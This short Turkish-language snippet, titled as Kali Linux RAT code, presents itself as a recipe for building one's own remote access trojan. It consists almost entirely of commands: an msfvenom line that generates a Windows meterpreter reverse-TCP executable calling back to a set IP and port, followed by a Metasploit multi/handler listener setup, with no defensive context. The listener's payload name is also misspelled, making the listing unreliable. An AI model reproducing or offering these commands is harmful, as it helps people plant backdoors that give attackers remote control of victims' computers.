### Kali Linux RAT Kodları
Buradaki kodu Kali Linux terminaline yazdığınızda kendi RAT'ınızı yapabilirsiniz.

Bir terminal açın

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -f exe > dosyaadı.exe
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/revese_tcp
set LHOST makineipsi
set LPORT 4444
run
